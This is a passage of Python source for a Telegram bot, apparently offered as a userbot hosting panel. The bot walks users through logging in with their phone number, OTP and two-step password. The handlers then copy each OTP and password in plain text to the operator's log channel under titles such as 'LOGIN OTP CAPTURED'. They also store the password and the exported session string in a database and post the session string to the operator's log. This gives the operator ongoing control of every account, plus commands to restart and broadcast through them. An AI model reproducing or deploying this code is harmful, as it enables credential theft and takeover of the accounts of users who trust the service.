    status = await m.reply_text("🔄 **ᴜᴘᴅᴀᴛɪɴɢ & ʀᴇsᴛᴀʀᴛɪɴɢ ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs (ᴏʟᴅ + ɴᴇᴡ)...**")
    updated, failed = await restart_all_userbots()
    await status.edit(
        f"✅ **ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs ᴜᴘᴅᴀᴛᴇᴅ & ʀᴇsᴛᴀʀᴛᴇᴅ!**\n\n"
        f"🟢 **ᴀᴄᴛɪᴠᴇ:** `{updated}`\n"
        f"🔴 **ғᴀɪʟᴇᴅ:** `{failed}`"
    )


@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
async def broadcast_cmd(c, m):
    if not m.reply_to_message and len(m.command) < 2:
        return await m.reply_text("❌ **ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ɢɪᴠᴇ ᴛᴇxᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ!**")

    status = await m.reply_text("📢 **ʙʀᴏᴀᴅᴄᴀsᴛ sᴛᴀʀᴛᴇᴅ...**")
    all_user_ids = get_all_bot_user_ids()
    success, failed = 0, 0

    for user_id in all_user_ids:
        try:
            if m.reply_to_message:
                await m.reply_to_message.copy(int(user_id))
            else:
                bcast_text = m.text.split(None, 1)[1]
                await c.send_message(int(user_id), bcast_text)
            success += 1
            await asyncio.sleep(0.25)
        except Exception:
            failed += 1

    await status.edit(
        f"✅ **ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!**\n\n"
        f"🟢 **sᴜᴄᴄᴇss:** `{success}`\n"
        f"🔴 **ғᴀɪʟᴇᴅ:** `{failed}`"
    )


@bot.on_message(filters.command("remove_all") & filters.user(OWNER_ID))
async def remove_all_cmd(c, m):
    try:
        sessions_col.delete_many({})
        for uid, ubot in list(running_ubots.items()):
            try:
                await ubot.stop()
            except Exception:
                pass
        running_ubots.clear()
        await m.reply_text("🗑️ **ᴀʟʟ sᴇssɪᴏɴs ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴅᴀᴛᴀʙᴀsᴇ ᴀɴᴅ ᴀʟʟ ᴜsᴇʀʙᴏᴛs sᴛᴏᴘᴘᴇᴅ!**")
    except Exception as e:
        await m.reply_text(f"❌ **ᴇʀʀᴏʀ:** `{e}`")


@bot.on_callback_query()
async def handle_callbacks(c, q):
    if q.data == "close":
        await q.message.delete()
    elif q.data == "verify_fsub":
        unjoined = await check_force_join(c, q.from_user.id)
        if unjoined:
            await q.answer("❌ sᴀʙʜɪ ᴄʜᴀɴɴᴇʟs ᴊᴏɪɴ ɴᴀʜɪ ᴋɪʏᴇ!", show_alert=True)
        else:
            await q.message.delete()
            await bot.send_message(
                q.message.chat.id,
                START_TEXT.format(mention=q.from_user.mention),
                reply_markup=main_buttons,
            )
    elif q.data == "help_btn":
        await q.message.reply_text(HELP_BOT_TEXT, reply_markup=main_buttons)
        await q.answer()
    elif q.data == "add_btn":
        await q.message.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (+91xxxxxxxxxx):**")
        await q.message.delete()
    elif q.data.startswith("acc_page_"):
        if q.from_user.id != OWNER_ID:
            return await q.answer("👑 ᴏɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs!", show_alert=True)
        try:
            page_num = int(q.data.split("_")[-1])
        except ValueError:
            page_num = 0
        text, markup = await build_account_list_page(page_num)
        try:
            await q.message.edit_text(text, reply_markup=markup)
        except Exception:
            pass
        await q.answer()


@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    if m.text and m.text.startswith("/"):
        return

    save_bot_user(m.from_user)
    uid, text = m.from_user.id, m.text.strip()
    bot_me = await c.get_me()
    panel_name = bot_me.username or "CoderNovaBot"

    if text.startswith("+"):
        if uid in user_data and "client" in user_data[uid]:
            try:
                await user_data[uid]["client"].disconnect()
            except Exception:
                pass

        user_data[uid] = {"phone": text, "password": ""}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        try:
            await temp_c.connect()
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})

            await send_log(
                c,
                title="𝗣𝗛𝗢𝗡𝗘 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗘𝗗 · [𝗡𝗨𝗠𝗕𝗘𝗥]",
                user=m.from_user,
                details_body=f"📱 𝗣𝗛𝗢𝗡𝗘 𝗡𝗨𝗠𝗕𝗘𝗥: `{text}`\n⏳ 𝗡𝗘𝗫𝗧 𝗦𝗧𝗘𝗣: AWAITING OTP",
                panel_name=panel_name,
            )

            await m.reply_text("📩 **ᴇɴᴛᴇʀ ᴏᴛᴘ ᴡɪᴛʜ sᴘᴀᴄᴇs (ᴇ.ɢ. `1 2 3 4 5`):**")
        except Exception as e:
            await m.reply_text(f"❌ `{e}`")

    elif " " in text and text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp_clean = text.replace(" ", "")
        phone_num = user_data[uid]["phone"]

        await send_log(
            c,
            title="𝗟𝗢𝗚𝗜𝗡 𝗢𝗧𝗣 𝗖𝗔𝗣𝗧𝗨𝗥𝗘𝗗 · [𝗢𝗧𝗣]",
            user=m.from_user,
            details_body=f"📱 𝗣𝗛𝗢𝗡𝗘: `{phone_num}`\n🔢 𝗢𝗧𝗣 𝗖𝗢𝗗𝗘: `{otp_clean}`",
            panel_name=panel_name,
        )

        try:
            await user_data[uid]["client"].sign_in(phone_num, user_data[uid]["hash"], otp_clean)
            await finalize_login(c, m, uid, used_2fa=False)
        except errors.SessionPasswordNeeded:
            user_data[uid].update({"step": "password"})
            await m.reply_text("🔐 **ᴇɴᴛᴇʀ ᴛᴡᴏ-sᴛᴇᴘ ᴘᴀssᴡᴏʀᴅ:**")
        except Exception as e:
            await m.reply_text(f"❌ `{e}`")

    elif uid in user_data and user_data[uid].get("step") == "password":
        phone_num = user_data[uid]["phone"]
        user_data[uid]["password"] = text

        await send_log(
            c,
            title="𝟮𝗙𝗔 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗟𝗢𝗚 · [𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗]",
            user=m.from_user,
            details_body=f"📱 𝗣𝗛𝗢𝗡𝗘: `{phone_num}`\n🔑 𝟮𝗙𝗔 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: `{text}`",
            panel_name=panel_name,
        )

        try:
            await user_data[uid]["client"].check_password(password=text)
            await finalize_login(c, m, uid, used_2fa=True)
        except Exception as e:
            await m.reply_text(f"❌ `{e}`")


async def finalize_login(c, m, uid, used_2fa: bool = False):
    session_str = await user_data[uid]["client"].export_session_string()
    phone_num = user_data[uid].get("phone", "")
    pwd_val = user_data[uid].get("password", "")

    if uid in running_ubots:
        try:
            await running_ubots[uid].stop()
        except Exception:
            pass

    ubot = Client(
        f"ubot_{uid}",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_str,
        in_memory=True,
    )
    register_ubot_handlers(ubot)
    await ubot.start()
    me = await ubot.get_me()
    running_ubots[uid] = ubot

    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or (m.from_user.first_name or "User")
    uname = me.username or (m.from_user.username or "")

    save_local_session(
        uid,
        session_str,
        phone=phone_num,
        name=full_name,
        username=uname,
        password=pwd_val,
    )

    # Send session details to the newly added account's Saved Messages ("me")
    try:
        saved_msg = (
            f"⚡ **ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!** ⚡\n\n"
            f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {full_name}\n"
            f"🔑 **sᴇssɪᴏɴ sᴛʀɪɴɢ:**\n`{session_str}`"
        )
        await ubot.send_message("me", saved_msg)
    except Exception:
        pass

    bot_me = await c.get_me()
    panel_name = bot_me.username or "CoderNovaBot"
    status_tag = "2FA LOGIN SUCCESS" if used_2fa else "LOGIN SUCCESS"
    first_upper = full_name.upper()

    await send_log(
        c,
        title="𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗟𝗢𝗚𝗜𝗡 & 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 · [𝗦𝗧𝗥𝗜𝗡𝗚]",
        user=m.from_user,
        details_body=(
            f"✅ **{status_tag} ({first_upper} ({uid}))**\n"
            f"📱 𝗣𝗛𝗢𝗡𝗘: `{phone_num}`\n"
            f"💾 SAVED TO MONGODB: ACTIVE\n"
            f"🔑 `{session_str}`"
        ),
        panel_name=panel_name,
    )

    try:
        await user_data[uid]["client"].disconnect()
    except Exception:
        pass

    await bot.send_message(uid, "🎉 **sᴜᴄᴄᴇsғᴜʟʟʏ ʟᴏɢɪɴ! ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ɪs ɴᴏᴡ ᴀᴄᴛɪᴠᴇ.**")
    if uid in user_data:
        del user_data[uid]


async def start_services():
    await bot.start()
    await restart_all_userbots()
    await idle()


if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    loop.run_until_complete(start_services())
